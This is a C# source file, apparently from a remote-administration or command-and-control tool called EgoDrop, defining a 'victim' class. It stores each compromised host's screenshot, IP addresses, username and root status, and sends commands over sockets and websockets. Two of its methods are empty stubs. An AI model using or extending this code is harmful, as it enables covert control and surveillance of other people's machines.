using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

using Fleck;

namespace EgoDrop
{
    public class clsVictim
    {
        public struct stVictimConfig
        {
            public Image imgScreen;
            public string szID;
            public string szIpAddrInternal;
            public string szIpAddrExternal;
            public uint nUid;
            public string szUsername;
            public bool bIsRoot { get { return nUid == 0; } }
            public string szFilePath;
        }

        public Socket m_sktClnt { get; set; }
        public IWebSocketConnection m_sktConn { get; set; }

        public byte[] m_abBuffer = new byte[65535];

        public clsCrypto m_crypto { get; set; }
        public clsListener m_listener { get; set; }

        public clsVictim(Socket sktClnt, clsListener listener)
        {
            m_sktClnt = sktClnt;
            m_listener = listener;

            m_crypto = new clsCrypto(true);
        }
        public clsVictim(IWebSocketConnection sktConn, clsListener listener)
        {
            m_sktConn = sktConn;
            m_listener = listener;

            m_crypto = new clsCrypto(true);
        }

        public void fnSend(uint nCommand, uint nParam, string szMsg) => fnSend(nCommand, nParam, Encoding.UTF8.GetBytes(szMsg));
        public void fnSend(uint nCommand, uint nParam, byte[] abMsg) => fnSendRaw(new clsEDP((byte)nCommand, (byte)nParam, abMsg).fnabGetBytes());
        public void fnSendRaw(byte[] abBuffer)
        {
            m_sktClnt.BeginSend(abBuffer, 0, abBuffer.Length, SocketFlags.None, new AsyncCallback((ar) =>
            {
                try
                {
                    m_sktClnt.EndSend(ar);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message);
                }
            }), abBuffer);
        }

        public void fnSendEncryptedCommand(uint nCommand, uint nParam, byte[] abMsg)
        {

        }

        public void fnSendCmdParam(uint nCmd, uint nParam)
        {
            clsEDP edp = new clsEDP((byte)nCmd, (byte)nParam, Encoding.UTF8.GetBytes(clsEZData.fnGenerateRandomStr()));
            fnSendRaw(edp.fnabGetBytes());
        }

        public void fnSendCommand()
        {

        }
    }
}
